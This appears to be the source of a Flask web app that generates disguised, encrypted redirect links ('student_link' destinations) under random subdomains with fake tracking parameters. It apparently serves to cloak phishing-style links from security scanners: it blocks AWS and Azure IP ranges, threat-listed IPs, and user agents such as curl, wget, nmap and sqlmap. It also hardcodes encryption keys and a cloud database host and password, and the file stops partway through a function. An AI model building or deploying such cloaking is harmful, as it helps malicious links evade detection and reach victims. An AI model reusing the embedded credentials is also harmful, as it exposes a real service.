from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
import random
import math
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
import bleach
from dotenv import load_dotenv
import ipaddress
import string
import sys
from bs4 import BeautifulSoup

app = Flask(__name__)
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)
logger.debug("Initializing Flask app")

# Configuration values
FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
AES_GCM_KEY = b'\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09'
HMAC_KEY = b'\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9'
VALKEY_HOST = "valkey-c93d570-marychamberlin31-5857.g.aivencloud.com"
VALKEY_PORT = 25534
VALKEY_USERNAME = "default"
VALKEY_PASSWORD = "AVNS_iypeRGpnvMGXCd4ayYL"
DATA_RETENTION_DAYS = 90
USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
BLOCKLIST_URL = "https://raw.githubusercontent.com/stamparm/ipsum/master/ipsum.txt"
AWS_CIDR_URL = "https://ip-ranges.amazonaws.com/ip-ranges.json"
AZURE_CIDR_URL = "https://www.microsoft.com/en-us/download/confirmation.aspx?id=56519"

# Anti-bot settings
SUSPICIOUS_UA_PATTERNS = [
    r'bot', r'crawler', r'spider', r'scanner', r'curl', r'wget', r'python-requests',
    r'httpclient', r'zgrab', r'masscan', r'nmap', r'probe', r'sqlmap'
]
REQUIRED_HEADERS = ['Accept', 'Accept-Language', 'Connection']
BLOCKED_CIDR_CACHE_KEY = "blocked_cidr"
BLOCKED_CIDR_REFRESH_INTERVAL = 3600
RISK_SCORE_THRESHOLD = 75
MAX_PAYLOAD_PADDING = 64

# Verify keys at startup
try:
    if len(AES_GCM_KEY) != 32:
        raise ValueError("AES-GCM key must be 32 bytes")
    Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(secrets.token_bytes(12)), backend=default_backend())
    logger.debug("AES-GCM key validated successfully")
except Exception as e:
    logger.error(f"Invalid AES-GCM key at startup: {str(e)}")
    raise ValueError(f"AES-GCM key initialization failed: {str(e)}")

try:
    if len(HMAC_KEY) != 32:
        raise ValueError("HMAC key must be 32 bytes")
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(b"test")
    h.finalize()
    logger.debug("HMAC key validated successfully")
except Exception as e:
    logger.error(f"Invalid HMAC key at startup: {str(e)}")
    raise ValueError(f"HMAC key initialization failed: {str(e)}")

# Flask configuration
try:
    app.config['SECRET_KEY'] = FLASK_SECRET_KEY
    app.config['WTF_CSRF_SECRET_KEY'] = WTF_CSRF_SECRET_KEY
    app.config['SESSION_COOKIE_HTTPONLY'] = True
    app.config['SESSION_COOKIE_SECURE'] = True
    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
    app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
    logger.debug("Flask configuration set successfully")
except Exception as e:
    logger.error(f"Error setting Flask config: {str(e)}", exc_info=True)
    raise

# CSRF protection
csrf = CSRFProtect(app)

# Register after_request globally
@app.after_request
def add_noise_headers(response):
    response.headers['X-Random-Token'] = secrets.token_hex(8)
    response.headers['X-Session-ID'] = generate_random_string(16)
    return response

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username is required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Username can only contain letters, numbers, _, @, or .")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain is required"),
        Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
    ])
    randomstring1 = StringField('Randomstring1', validators=[
        DataRequired(message="Randomstring1 is required"),
        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link is required"),
        URL(message="Invalid URL format (must start with http:// or https://)")
    ])
    randomstring2 = StringField('Randomstring2', validators=[
        DataRequired(message="Randomstring2 is required"),
        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
    ])
    expiry = SelectField('Expiry', choices=[
        ('300', '5 Minutes'),
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week')
    ], default='3600')
    analytics_enabled = BooleanField('Enable Analytics')
    submit = SubmitField('Generate URL')

# Valkey initialization
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.debug("Valkey connection established successfully")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
    valkey_client = None

# Custom Jinja2 filter for datetime
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except (TypeError, ValueError) as e:
        logger.error(f"Error formatting timestamp: {str(e)}")
        return "Not Available"

app.jinja_env.filters['datetime'] = datetime_filter

# Blocklist management
def fetch_blocked_cidrs():
    blocked_cidrs = []
    try:
        # Fetch AWS CIDRs
        aws_response = requests.get(AWS_CIDR_URL, timeout=10)
        aws_response.raise_for_status()
        aws_data = aws_response.json()
        for prefix in aws_data.get('prefixes', []) + aws_data.get('ipv6_prefixes', []):
            cidr = prefix.get('ip_prefix') or prefix.get('ipv6_prefix')
            if cidr:
                blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))

        # Fetch Azure CIDRs (scrape JSON URL from confirmation page)
        azure_response = requests.get(AZURE_CIDR_URL, timeout=10)
        azure_response.raise_for_status()
        soup = BeautifulSoup(azure_response.text, 'html.parser')
        json_url = soup.find('a', href=re.compile(r'.*\.json$'))
        if json_url:
            json_response = requests.get(json_url['href'], timeout=10)
            json_response.raise_for_status()
            azure_data = json_response.json()
            for value in azure_data.get('values', []):
                for cidr in value.get('properties', {}).get('addressPrefixes', []):
                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))

        # Fetch malicious CIDRs
        blocklist_response = requests.get(BLOCKLIST_URL, timeout=10)
        blocklist_response.raise_for_status()
        for line in blocklist_response.text.splitlines():
            if line.strip() and not line.startswith('#'):
                try:
                    blocked_cidrs.append(ipaddress.ip_network(line.split()[0], strict=False))
                except ValueError:
                    continue

        if valkey_client:
            valkey_client.setex(BLOCKED_CIDR_CACHE_KEY, BLOCKED_CIDR_REFRESH_INTERVAL, json.dumps([str(cidr) for cidr in blocked_cidrs]))
        logger.debug(f"Fetched {len(blocked_cidrs)} blocked CIDRs")
        return blocked_cidrs
    except Exception as e:
        logger.error(f"Error fetching blocked CIDRs: {str(e)}")
        if valkey_client:
            cached = valkey_client.get(BLOCKED_CIDR_CACHE_KEY)
            if cached:
                return [ipaddress.ip_network(cidr) for cidr in json.loads(cached)]
        return []

# Anti-bot utilities
def calculate_request_entropy(headers, query_params):
    entropy = 0
    for value in list(headers.values()) + list(query_params.values()):
        if value:
            freq = {}
            for char in value:
                freq[char] = freq.get(char, 0) + 1
            for count in freq.values():
                prob = count / len(value)
                entropy -= prob * math.log2(prob) if prob > 0 else 0
    return entropy

def generate_request_fingerprint():
    headers = {k: v for k, v in request.headers.items() if k in REQUIRED_HEADERS}
    timing = str(int(time.time() * 1000) % 10000)
    return hashlib.sha256(f"{json.dumps(headers, sort_keys=True)}{timing}".encode()).hexdigest()

def is_suspicious_request():
    risk_score = 0
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '').lower()
    headers = request.headers
    query_params = request.args

    # Check blocked CIDRs
    blocked_cidrs = fetch_blocked_cidrs()
    try:
        ip_addr = ipaddress.ip_address(ip)
        if any(ip_addr in cidr for cidr in blocked_cidrs):
            risk_score += 50
            logger.debug(f"IP {ip} in blocked CIDR")
    except ValueError:
        logger.warning(f"Invalid IP address: {ip}")
        risk_score += 20

    # User-Agent analysis
    if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SUSPICIOUS_UA_PATTERNS):
        risk_score += 30
        logger.debug(f"Suspicious User-Agent: {ua}")

    # Header validation
    missing_headers = [h for h in REQUIRED_HEADERS if h not in headers]
    if missing_headers:
        risk_score += 20
        logger.debug(f"Missing headers: {missing_headers}")

    # Entropy analysis
    entropy = calculate_request_entropy(headers, query_params)
    if entropy < 5:
        risk_score += 25
        logger.debug(f"Low request entropy: {entropy}")

    # Request timing
    if valkey_client:
        last_request_key = f"last_request:{ip}"
        last_time = valkey_client.get(last_request_key)
        if last_time and (time.time() - float(last_time) < 0.01):
            risk_score += 15
            logger.debug(f"Rapid request from IP: {ip}")
        valkey_client.setex(last_request_key, 60, time.time())

    # Store risk score
    if valkey_client:
        valkey_client.hincrby(f"risk_score:{ip}", "score", risk_score)
        valkey_client.expire(f"risk_score:{ip}", 3600)

    return risk_score >= RISK_SCORE_THRESHOLD

# Dynamic rate limiting
def dynamic_rate_limit(base_limit=5, base_per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            if not valkey_client:
                logger.warning("Valkey unavailable, skipping rate limit")
                return f(*args, **kwargs)
            ip = request.remote_addr
            risk_score = int(valkey_client.hget(f"risk_score:{ip}", "score") or 0)
            limit = max(1, base_limit - (risk_score // 20))
            per = random.randint(base_per - 10, base_per + 10)
            key = f"rate_limit:{ip}:{f.__name__}:{secrets.token_hex(4)}"
            try:
                current = valkey_client.get(key)
                if current is None:
                    valkey_client.setex(key, per, 1)
                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                elif int(current) >= limit:
                    logger.warning(f"Rate limit exceeded for IP: {ip}, risk_score: {risk_score}")
                    abort(429, "Too Many Requests")
                else:
                    valkey_client.incr(key)
                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                return f(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}")
                return f(*args, **kwargs)
        return wrapped_function
    return decorator

# Payload encryption and obfuscation
def encrypt_payload(payload):
    try:
        # Add random padding
        padding = secrets.token_bytes(random.randint(16, MAX_PAYLOAD_PADDING))
        padded_payload = json.dumps({
            "data": payload,
            "decoy": secrets.token_hex(32),
            "timestamp": int(time.time())
        }).encode() + padding

        # Base64 encode for UTF-8 safety
        b64_payload = base64.urlsafe_b64encode(padded_payload)

        # AES-GCM encryption
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag

        # HMAC signature
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted)
        signature = h.finalize()

        # Split payload into parts
        parts = []
        chunk_size = len(encrypted) // 2 + random.randint(-20, 20)
        for i in range(0, len(encrypted), chunk_size):
            parts.append(base64.urlsafe_b64encode(encrypted[i:i+chunk_size]).decode())
        sig = base64.urlsafe_b64encode(signature).decode()
        slug = f"{uuid.uuid4()}{secrets.token_hex(10)}"
        
        # Store parts in Valkey
        if valkey_client:
            for i, part in enumerate(parts):
                valkey_client.setex(f"payload_part:{slug}:{i}", 3600, part)
            valkey_client.setex(f"payload_parts_count:{slug}", 3600, len(parts))

        result = f"{base64.urlsafe_b64encode(slug.encode()).decode()}.{sig}"
        logger.debug(f"Encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"Payload encryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_payload(encrypted):
    try:
        parts = encrypted.split('.')
        if len(parts) != 2:
            raise ValueError("Invalid payload format")
        slug_b64, sig_b64 = parts
        slug = base64.urlsafe_b64decode(slug_b64).decode()
        signature = base64.urlsafe_b64decode(sig_b64)

        # Reassemble payload from parts
        if not valkey_client:
            raise ValueError("Valkey unavailable for payload parts")
        parts_count = int(valkey_client.get(f"payload_parts_count:{slug}") or 0)
        if parts_count == 0:
            raise ValueError("Payload parts not found")

        encrypted_data = b""
        for i in range(parts_count):
            part = valkey_client.get(f"payload_part:{slug}:{i}")
            if not part:
                raise ValueError(f"Payload part {i} not found")
            encrypted_data += base64.urlsafe_b64decode(part)

        # Verify HMAC
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted_data)
        h.verify(signature)

        # AES-GCM decryption
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        b64_payload = decryptor.update(ciphertext) + decryptor.finalize()

        # Decode base64
        padded_payload = base64.urlsafe_b64decode(b64_payload)
        payload_json = json.loads(padded_payload.decode().split('}')[0] + '}')
        result = payload_json['data']
        logger.debug(f"Decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"Payload decryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Decryption failed: {str(e)}")

# URL generation utilities
def generate_random_string(length):
    characters = string.ascii_letters + string.digits + '-_'
    return ''.join(secrets.choice(characters) for _ in range(length))

def get_valid_usernames():
    try:
        if valkey_client:
            cached = valkey_client.get("usernames")
            if cached:
                logger.debug("Retrieved usernames from Valkey cache")
                return json.loads(cached)
        response = requests.get(USER_TXT_URL)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            valkey_client.setex("usernames", 3600, json.dumps(usernames))
            logger.debug("Cached usernames in Valkey")
        logger.debug(f"Fetched {len(usernames)} usernames")
        return usernames
    except Exception as e:
        logger.error(f"Error fetching usernames: {str(e)}")
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            logger.debug(f"Redirecting to login from {request.url}")
            return redirect(url_for('login', next=request.url))
        logger.debug(f"Authenticated user: {session['username']}")
        return f(*args, **kwargs)
    return decorated_function

def get_base_domain():
    try:
        host = request.host
        parts = host.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else host
    except Exception as e:
        logger.error(f"Error getting base domain: {str(e)}")
        return "tamarisksd.com"

@app.before_request
def block_suspicious_requests():
    try:
        if is_suspicious_request():
            logger.warning(f"Blocked suspicious request from {request.remote_addr}: {request.url}")
            abort(403, "Access Denied")
    except Exception as e:
        logger.error(f"Error in block_suspicious_requests: {str(e)}")

@app.route("/login", methods=["GET", "POST"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def login():
    try:
        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}")
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            logger.debug(f"Login attempt with username: {username}")
            valid_usernames = get_valid_usernames()
            if username in valid_usernames:
                session['username'] = username
                session.permanent = True
                session.modified = True
                logger.debug(f"User {username} logged in")
                next_url = form.next_url.data or url_for('dashboard')
                return redirect(next_url)
            logger.warning(f"Invalid login attempt: {username}")
            form.username.errors.append("Invalid username")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-600 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-5">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Username</label>
                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                        </div>
                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                    </form>
                </div>
            </body>
            </html>
        """, form=form)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def index():
    try:
        logger.debug(f"Accessing root URL, host: {request.host}")
        if 'username' in session:
            return redirect(url_for('dashboard'))
        return redirect(url_for('login'))
    except Exception as e:
        logger.error(f"Error in index: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
@dynamic_rate_limit(base_limit=5, base_per=60)
def dashboard():
    try:
        username = session['username']
        logger.debug(f"Accessing dashboard for user: {username}")
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            subdomain = bleach.clean(form.subdomain.data.strip())
            randomstring1 = bleach.clean(form.randomstring1.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            randomstring2 = bleach.clean(form.randomstring2.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL: Must be a valid http:// or https:// URL"
                logger.warning(f"Invalid destination_link: {destination_link}")

            if not error:
                path_segment = f"{randomstring1}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
                endpoint = generate_random_string(16)
                expiry_timestamp = int(time.time()) + expiry
                payload = json.dumps({
                    "student_link": destination_link,
                    "timestamp": int(time.time() * 1000),
                    "expiry": expiry_timestamp,
                    "fingerprint": generate_request_fingerprint()
                })

                try:
                    encrypted_payload = encrypt_payload(payload)
                except ValueError as e:
                    logger.error(f"Encryption failed: {str(e)}")
                    error = "Failed to encrypt payload"

                if not error:
                    fake_params = f"?utm_source={generate_random_string(8)}&session={secrets.token_hex(6)}"
                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}{fake_params}"
                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                    if valkey_client:
                        valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
                            "url": generated_url,
                            "destination": destination_link,
                            "encrypted_payload": encrypted_payload,
                            "endpoint": endpoint,
                            "created": int(time.time()),
                            "expiry": expiry_timestamp,
                            "clicks": 0,
                            "analytics_enabled": "1" if analytics_enabled else "0"
                        })
                        valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                        logger.info(f"Generated URL for {username}: {generated_url}")
                        return redirect(url_for('dashboard'))
                    else:
                        error = "Database unavailable"

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                for key in url_keys:
                    url_data = valkey_client.hgetall(key)
                    if not url_data:
                        continue
                    url_id = key.split(':')[-1]
                    urls.append({
                        "url": url_data.get('url', ''),
                        "destination": url_data.get('destination', ''),
                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "clicks": int(url_data.get('clicks', 0)),
                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                        "url_id": url_id
                    })
            except Exception as e:
                logger.error(f"Valkey error fetching URLs: {str(e)}")
                valkey_error = "Unable to fetch URL history"

        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
        primary_color = f"#{theme_seed}"

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Dashboard - {{ username }}</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); color: #1f2937; }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                    .card:hover { transform: translateY(-5px); }
                    .error { background: #fee2e2; color: #b91c1c; }
                    .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                    .toggle-switch input { opacity: 0; width: 0; height: 0; }
                    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
                    .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
                    input:checked + .slider { background-color: #4f46e5; }
                    input:checked + .slider:before { transform: translateX(26px); }
                </style>
                <script>
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else {
                                alert('Failed to toggle analytics');
                            }
                        }).catch(error => {
                            console.error('Error toggling analytics:', error);
                            alert('Error toggling analytics');
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="container max-w-7xl mx-auto">
                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center rounded-lg">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="bg-white p-8 rounded-xl card mb-8">
                        <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
                        <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                        <form method="POST" class="space-y-5">
                            {{ form.csrf_token }}
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Subdomain</label>
                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Expiry</label>
                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Enable Analytics</label>
                                {{ form.analytics_enabled(class="mt-1 p-3") }}
                            </div>
                            {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                        </form>
                    </div>
                    <div class="bg-white p-8 rounded-xl card">
                        <h2 class="text-2xl font-bold mb-6 text-gray-900">URL History</h2>
                        {% if urls %}
                            {% for url in urls %}
                                <div class="card bg-gray-50 p-6 rounded-lg mb-4">
                                    <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                    <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                    <div class="flex items-center mt-2">
                                        <label class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
                                        <label class="toggle-switch">
                                            <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                            <span class="slider"></span>
                                        </label>
                                    </div>
                                    <div class="mt-2 flex space-x-2">
                                        <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Are you sure you want to delete this URL?')">Delete URL</a>
                                    </div>
                                </div>
                            {% endfor %}
                        {% else %}
                            <p class="text-gray-600">No URLs generated yet.</p>
                        {% endif %}
                    </div>
                </div>
            </body>
            </html>
        """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
    except Exception as e:
        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
                </div>
            </body>
            </html>
        """, error=str(e)), 500

@app.route("/toggle_analytics/<url_id>", methods=["POST"])
@login_required
@csrf.exempt
def toggle_analytics(url_id):
    try:
        username = session['username']
        data = request.get_json()
        if not data or 'csrf_token' not in data:
            logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "CSRF token required"}), 403
        form = GenerateURLForm(csrf_token=data['csrf_token'])
        if not form.validate_csrf_token(form.csrf_token):
            logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
        if valkey_client:
            key = f"user:{username}:url:{url_id}"
            if not valkey_client.exists(key):
                logger.warning(f"URL {url_id} not found for user {username}")
                return jsonify({"status": "error", "message": "URL not found"}), 404
            current = valkey_client.hget(key, "analytics_enabled")
            new_value = "0" if current == "1" else "1"
            valkey_client.hset(key, "analytics_enabled", new_value)
